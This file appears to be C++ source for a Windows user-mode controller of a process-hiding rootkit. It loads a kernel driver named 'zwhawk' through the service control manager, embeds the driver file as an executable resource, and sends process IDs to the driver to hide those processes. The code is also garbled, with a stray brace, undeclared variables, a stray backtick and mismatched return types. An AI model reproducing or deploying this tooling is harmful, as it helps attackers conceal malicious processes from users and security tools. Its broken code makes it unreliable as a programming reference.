#include <stdio.h>
#include <Windows.h>
#include <string>

BYTE read_data_file(char *driver_name){

    char aSysPath[1024];
    char aCurrentDirectory[515];

    /*
    Retrieves the current directory for the current process.

    DWORD WINAPI GetCurrentDirectory(
      _In_  DWORD  nBufferLength, // The length of the buffer for the current directory string, in TCHARs.
      _Out_ LPTSTR lpBuffer // A pointer to the buffer that receives the current directory string.
    );
    */
    GetCurrentDirectory( 512, aCurrentDirectory);

    //int _snprintf( char *buffer, size_t count, const char *format [, argument] ... );
    _snprintf(aSysPath,1022,"%s\\%s.sys",aCurrentDirectory,driver_name);

    HANDLE hFile;
    DWORD dwFileSize, dwBytesRead, dwBytesWrite;
    LPBYTE lpBuffer;

    /*
    Creates or opens a file or I/O device.

    HANDLE WINAPI CreateFile(
      _In_     LPCTSTR               lpFileName, // The name of the file or device to be created or opened.
      _In_     DWORD                 dwDesiredAccess, // The requested access to the file or device, read, write, both or neither.
      _In_     DWORD                 dwShareMode, // If this parameter is zero and CreateFile succeeds, the file or device
                                                  // cannot be shared and cannot be opened again until the handle to the file or device is closed.
      _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, // A pointer to a SECURITY_ATTRIBUTES structure
      _In_     DWORD                 dwCreationDisposition, // An action to take on a file or device that exists or does not exist.
      _In_     DWORD                 dwFlagsAndAttributes, // The file or device attributes and flags
      _In_opt_ HANDLE                hTemplateFile // A valid handle to a template file with the GENERIC_READ access right.
    );
    */
    hFile = CreateFile(aSysPath, GENERIC_READ,
                   0,
                   NULL,
                   OPEN_EXISTING,
                   FILE_ATTRIBUTE_NORMAL,
                   NULL);
    // If CreateFile succeeded
    if (INVALID_HANDLE_VALUE == hFile)
    {
        printf("read_data_file - CreateFile failed (%Iu)\n", GetLastError());
        return false;
    }

    /*
    Retrieves the size of the specified file, in bytes.

    DWORD WINAPI GetFileSize(
      _In_      HANDLE  hFile, // A handle to the file.
      _Out_opt_ LPDWORD lpFileSizeHigh // A pointer to the variable where the high-order doubleword of the file size is returned.
    );
    */
    dwFileSize = GetFileSize(hFile, NULL);
    if (!(dwFileSize)){
        printf("read_data_file - GetFileSize failed (%Iu)\n", GetLastError());
        return false;
    }

    lpBuffer = new BYTE[dwFileSize];

    /*
    Reads data from the specified file or input/output (I/O) device.

    BOOL WINAPI ReadFile(
      _In_        HANDLE       hFile, // A handle to the device
      _Out_       LPVOID       lpBuffer, // A pointer to the buffer that receives the data read from a file or device.
      _In_        DWORD        nNumberOfBytesToRead, // The maximum number of bytes to be read.
      _Out_opt_   LPDWORD      lpNumberOfBytesRead, // A pointer to the variable that receives the number of bytes
                                                    // read when using a synchronous hFile parameter.
      _Inout_opt_ LPOVERLAPPED lpOverlapped // A pointer to an OVERLAPPED structure.
    );
    */
    if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL) == FALSE)
    {
        printf("read_data_file - ReadFile failed (%Iu)\n", GetLastError());
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    return lpBuffer;
}

bool encapsulation(char *driver_name, LPBYTE lpBuffer){
}
    HANDLE hResource1;
    char aExePath[1024];
    char aCurrentDirectory[515];

    /*
    Retrieves the current directory for the current process.

    DWORD WINAPI GetCurrentDirectory(
      _In_  DWORD  nBufferLength, // The length of the buffer for the current directory string, in TCHARs.
      _Out_ LPTSTR lpBuffer // A pointer to the buffer that receives the current directory string.
    );
    */
    GetCurrentDirectory( 512, aCurrentDirectory);
    _snprintf(aExePath,1022,"%s\\%s.exe",aCurrentDirectory,driver_name);

    /*
    Retrieves a handle that can be used by the UpdateResource function to add, delete,
    or replace resources in a binary module.

    HANDLE WINAPI BeginUpdateResource(
      _In_ LPCTSTR pFileName, // The binary file in which to update resources.
      _In_ BOOL    bDeleteExistingResources // Indicates whether to delete the pFileName parameter's existing resources.
    );
    */
    hResourceEXE = BeginUpdateResource(aExePath, FALSE);
    if (NULL == hResource1)
    {
        printf("encapsulation - BeginUpdateResource failed (%Iu)\n", GetLastError());
        return false;
    }

    /*
    Adds, deletes, or replaces a resource in a portable executable (PE) file.

    BOOL WINAPI UpdateResource(
      _In_     HANDLE  hUpdate, // A module handle returned by the BeginUpdateResource function, referencing the file to be updated.
      _In_     LPCTSTR lpType, // The resource type to be updated.
      _In_     LPCTSTR lpName, // The name of the resource to be updated.
      _In_     WORD    wLanguage, // The language identifier of the resource to be updated.
      _In_opt_ LPVOID  lpData, // The resource data to be inserted into the file indicated by hUpdate.
      _In_     DWORD   cbData // The size, in bytes, of the resource data at lpData.


    Creates a language identifier from a primary language identifier and a sublanguage identifier.

    WORD MAKELANGID(
       USHORT usPrimaryLanguage, // Primary language identifier.
       USHORT usSubLanguage // Sublanguage identifier.
    );
    );
    */
    if (UpdateResource(hResourceEXE, MAKEINTRESOURCE(10), MAKEINTRESOURCE(10), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID) lpBuffer, dwFileSize) == FALSE)
    {
        printf("encapsulation - UpdateResource failed (%Iu)\n", GetLastError());
        return false;
    }
    EndUpdateResource(hResourceEXE, FALSE);
    HMODULE hLibrary;
    HRSRC hResource;
    HGLOBAL hResourceLoaded;

    hLibrary = LoadLibrary(main_file);
    if (NULL != hLibrary)
    {
        hResource = FindResource(hLibrary, MAKEINTRESOURCE(10), MAKEINTRESOURCE(10));


        if (NULL != hResource)
        {
`
            hResourceLoaded = LoadResource(hLibrary, hResource);
            if (NULL != hResourceLoaded)
            {

                lpBuffer = (LPBYTE) LockResource(hResourceLoaded);
                if (NULL != lpBuffer)
                {
                }
            }
        }


    }


    DWORD dwBytesWritten;

    dwFileSize = SizeofResource(hLibrary, hResource);
    hFile = CreateFile(resource_file_out,
                       GENERIC_WRITE,
                       0,
                       NULL,
                       CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);

    if (INVALID_HANDLE_VALUE != hFile)
    {
        WriteFile(hFile, lpBuffer, dwFileSize, &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }

    return 0;
}

// Load driver to kernel space
bool load_kernel_code_scm(char *driver_name){
    char aPath[1024];
    char aCurrentDirectory[515];

    /*
    Establishes a connection to the service control manager

    SC_HANDLE WINAPI OpenSCManager(
      _In_opt_ LPCTSTR lpMachineName, // The name of the target computer
      _In_opt_ LPCTSTR lpDatabaseName, // The name of the service control manager database
      _In_     DWORD   dwDesiredAccess // The access to the service control manager
    );
    */
    SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(!sh)
    {
        printf("load_kernel_code_scm - OpenSCManager failed (%Iu)\n", GetLastError());
        return false;
    }

    /*
    Retrieves the current directory for the current process.

    DWORD WINAPI GetCurrentDirectory(
      _In_  DWORD  nBufferLength, // The length of the buffer for the current directory string, in TCHARs.
      _Out_ LPTSTR lpBuffer // A pointer to the buffer that receives the current directory string.
    );
    */
    GetCurrentDirectory( 512, aCurrentDirectory);

    //int _snprintf( char *buffer, size_t count, const char *format [, argument] ... );
    _snprintf(aPath,1022,"%s\\%s.sys",aCurrentDirectory,driver_name);
    printf("load_kernel_code_scm - loading %s\n", aPath);

    /*
    Creates a service object and adds it to the specified service control manager database.

    SC_HANDLE WINAPI CreateService(
      _In_      SC_HANDLE hSCManager, // A handle to the service control manager database.
      _In_      LPCTSTR   lpServiceName, // The name of the service to install.
      _In_opt_  LPCTSTR   lpDisplayName, // The display name to be used by user interface programs to identify the service.
      _In_      DWORD     dwDesiredAccess, // The access to the service.
      _In_      DWORD     dwServiceType, // The service type.
      _In_      DWORD     dwStartType, // The service start options.
      _In_      DWORD     dwErrorControl, // The severity of the error, and action taken, if this service fails to start.
      _In_opt_  LPCTSTR   lpBinaryPathName, // The fully qualified path to the service binary file.
      _In_opt_  LPCTSTR   lpLoadOrderGroup, // The names of the load ordering group of which this service is a member.
      _Out_opt_ LPDWORD   lpdwTagId, // A pointer to a variable that receives a tag value
      _In_opt_  LPCTSTR   lpDependencies, // A pointer to a double null-terminated array of null-separated names of services
                                          // or load ordering groups that the system must start before this service.
      _In_opt_  LPCTSTR   lpServiceStartName, // The name of the account under which the service should run.
      _In_opt_  LPCTSTR   lpPassword // The password to the account name specified by the lpServiceStartName parameter.
    );
    */
    SC_HANDLE rh = CreateService(sh,
            driver_name,
            driver_name,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            aPath,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL);

    if(!rh)
    {
        if (GetLastError() == ERROR_SERVICE_EXISTS)
        {
            /*
            Opens an existing service.

            SC_HANDLE WINAPI OpenService(
              _In_ SC_HANDLE hSCManager, // A handle to the service control manager database.
              _In_ LPCTSTR   lpServiceName, // The name of the service to be opened.
              _In_ DWORD     dwDesiredAccess // The access to the service.
            );


            Closes a handle to a service control manager or service object.

            BOOL WINAPI CloseServiceHandle(
              _In_ SC_HANDLE hSCObject // A handle to the service control manager object or the service object to close.
            );
            */
            rh = OpenService(sh,driver_name,SERVICE_ALL_ACCESS);
            if(!rh)
            {
                printf("load_kernel_code_scm - OpenService failed (%Iu)\n", GetLastError());
                CloseServiceHandle(sh);
                return false;
            }
        }
        else
        {
            printf("load_kernel_code_scm - CreateService failed (%Iu)\n", GetLastError());
            CloseServiceHandle(sh);
            return false;
        }
    }

    // start the drivers
    if(rh)
    {
        /*
        Starts a service.

        BOOL WINAPI StartService(
          _In_     SC_HANDLE hService, // A handle to the service.
          _In_     DWORD     dwNumServiceArgs, // The number of strings in the lpServiceArgVectors array.
          _In_opt_ LPCTSTR   *lpServiceArgVectors // The null-terminated strings to be passed to the ServiceMain function
                                                  // for the service as arguments.
        );
        */
        if(0 == StartService(rh, 0, NULL))
        {
            if(ERROR_SERVICE_ALREADY_RUNNING == GetLastError())
            {
                printf("load_kernel_code_scm - SERVICE_ALREADY_RUNNING");

            }
            else
            {
                printf("load_kernel_code_scm - StartService failed (%Iu)\n", GetLastError());
                CloseServiceHandle(sh);
                CloseServiceHandle(rh);
                return false;
            }
        }

        CloseServiceHandle(sh);
        CloseServiceHandle(rh);
    }

    return true;
}

// Unload driver from kernel space
bool unload_kernel_code_scm(char *driver_name){
    SC_HANDLE sh = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if(!sh)
    {
        printf("unload_kernel_code_scm - OpenSCManager failed (%Iu)\n", GetLastError());
        return false;
    }
    SC_HANDLE rh = OpenService(sh,driver_name,SERVICE_ALL_ACCESS);
    if(!rh)
    {
        printf("unload_kernel_code_scm - OpenService failed (%Iu)\n", GetLastError());
        CloseServiceHandle(sh);
        return false;
    }

    /*
    typedef struct _SERVICE_STATUS_PROCESS {
      DWORD dwServiceType;
      DWORD dwCurrentState;
      DWORD dwControlsAccepted;
      DWORD dwWin32ExitCode;
      DWORD dwServiceSpecificExitCode;
      DWORD dwCheckPoint;
      DWORD dwWaitHint;
      DWORD dwProcessId;
      DWORD dwServiceFlags;
    } SERVICE_STATUS_PROCESS, *LPSERVICE_STATUS_PROCESS;
    */
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;

    /*
    BOOL WINAPI QueryServiceStatusEx(
      _In_      SC_HANDLE      hService, // A handle to the service.
      _In_      SC_STATUS_TYPE InfoLevel, // The service attributes to be returned.
      _Out_opt_ LPBYTE         lpBuffer, // A pointer to the buffer that receives the status information.
      _In_      DWORD          cbBufSize, // The size of the buffer pointed to by the lpBuffer parameter, in bytes.
      _Out_     LPDWORD        pcbBytesNeeded // A pointer to a variable that receives the number of bytes needed to store all status information
    );

    */
    // Make sure the service is not already stopped.
    if ( !QueryServiceStatusEx( rh, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded ) )
    {
        printf("unload_kernel_code_scm - QueryServiceStatusEx failed (%Iu)\n", GetLastError());
        CloseServiceHandle(rh);
        CloseServiceHandle(sh);
        return false;

    }

    if ( ssp.dwCurrentState == SERVICE_STOPPED )
    {
        printf("unload_kernel_code_scm - Service is already stopped.\n");
        CloseServiceHandle(rh);
        CloseServiceHandle(sh);
        return false;
    }


    /*
    Sends a control code to a service.

    BOOL WINAPI ControlService(
      _In_  SC_HANDLE        hService, // A handle to the service.
      _In_  DWORD            dwControl, // control codes.
      _Out_ LPSERVICE_STATUS lpServiceStatus // A pointer to a SERVICE_STATUS structure that receives the latest service status information.
    );
    */
    if ( !ControlService(rh,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS) &ssp ) )
    {
        printf( "unload_kernel_code_scm - ControlService failed (%Iu)\n", GetLastError() );
        CloseServiceHandle(rh);
        CloseServiceHandle(sh);
        return false;
    }


    /*
    Marks the specified service for deletion from the service control manager database.

    BOOL WINAPI DeleteService(
      _In_ SC_HANDLE hService
    );
    */
    if ( !DeleteService(rh) )
    {
        printf( "unload_kernel_code_scm - DeleteService failed (%Iu)\n", GetLastError() );
        CloseServiceHandle(rh);
        CloseServiceHandle(sh);
        return false;
    }
    CloseServiceHandle(rh);
    CloseServiceHandle(sh);
    return true;
}

// Connect to SymbolicLink and send IRP to driver (
bool connect_driver(char *driver_name){
    /*
    typedef void *PVOID;
    typedef PVOID HANDLE;
    */
    HANDLE hFile;

    //typedef unsigned long DWORD;
    DWORD ProcessId,write;

    /*
    Creates or opens a file or I/O device.

    HANDLE WINAPI CreateFile(
      _In_     LPCTSTR               lpFileName, // The name of the file or device to be created or opened.
      _In_     DWORD                 dwDesiredAccess, // The requested access to the file or device, read, write, both or neither.
      _In_     DWORD                 dwShareMode, // If this parameter is zero and CreateFile succeeds, the file or device
                                                  // cannot be shared and cannot be opened again until the handle to the file or device is closed.
      _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, // A pointer to a SECURITY_ATTRIBUTES structure
      _In_     DWORD                 dwCreationDisposition, // An action to take on a file or device that exists or does not exist.
      _In_     DWORD                 dwFlagsAndAttributes, // The file or device attributes and flags
      _In_opt_ HANDLE                hTemplateFile // A valid handle to a template file with the GENERIC_READ access right.
    );
    */
    LPCTSTR driver;
    driver = (std::string("\\\\.\\") + std::string(driver_name)).c_str();
    hFile=CreateFile(driver,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);

    if(hFile==INVALID_HANDLE_VALUE)
    {
        // DWORD WINAPI GetLastError(void);
        printf("Error: Unable to connect to the driver (%Iu)\nMake sure the driver is loaded.",GetLastError());
        return -1;
    }

    while(1)
    {
        printf("\nEnter PID: ");
        scanf("%Iu",&ProcessId);
        /*
        BOOL WINAPI WriteFile(
          _In_        HANDLE       hFile, // A handle to the file or I/O device
          _In_        LPCVOID      lpBuffer, // A pointer to the buffer containing the data to be written to the file or device
          _In_        DWORD        nNumberOfBytesToWrite, // The number of bytes to be written to the file or device
          _Out_opt_   LPDWORD      lpNumberOfBytesWritten, // A pointer to the variable that receives the number of bytes written
                                                           // when using a synchronous hFile parameter
          _Inout_opt_ LPOVERLAPPED lpOverlapped
        );
        */
        if(!WriteFile(hFile,&ProcessId,sizeof(DWORD),&write,NULL))
        {
            printf("\nError: Unable to hide process (%Iu)\n",GetLastError());
        }

        else
        {
            printf("\nProcess successfully hidden.\n");
        }
    }

    return 0;
}

int main(){
    if( !load_kernel_code_scm("zwhawk") ){
        printf("main - load_kernel_code_scm failed (%Iu)\n", GetLastError());
        return -1;
    }
    connect_driver("zwhawk");
}
